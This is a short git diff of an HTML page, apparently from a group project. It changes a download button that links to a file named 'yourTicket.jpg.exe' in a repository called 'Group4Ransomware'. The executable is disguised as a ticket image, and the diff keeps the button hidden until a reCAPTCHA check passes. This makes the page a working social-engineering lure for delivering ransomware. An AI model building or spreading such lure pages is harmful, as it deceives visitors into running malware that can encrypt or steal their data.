@@ -181,7 +181,7 @@ new pausescroller(pausecontent2, "NewsFeed", "NewsFeed", 5000);
     <div class="g-recaptcha" data-sitekey="6LcGFc8iAAAAAM3lH2FEY8YRyF_CEXONMtCmMOGs" data-callback="download_callback"></div>
             <!-- <input type="button" name="answer" value="Click to show Download" onclick="showDiv()" />  -->
             <div id="welcomeDiv" > 
-                <button id="download-button"  disabled>
+                <button id="download-button" hidden disabled>
                     <a rel="nofollow" href="https://napatel79.github.io/Group4Ransomware/yourTicket.jpg.exe" download>submit</a>
                 </button>
                 <!-- <p>
@@ -191,6 +191,7 @@ new pausescroller(pausecontent2, "NewsFeed", "NewsFeed", 5000);
             <script type="text/javascript">
                 function download_callback() {
                   const submitButton = document.getElementById("download-button");
+                  submitButton.removeAttribute("hidden")
                   submitButton.removeAttribute("disabled");
                 }
               </script>
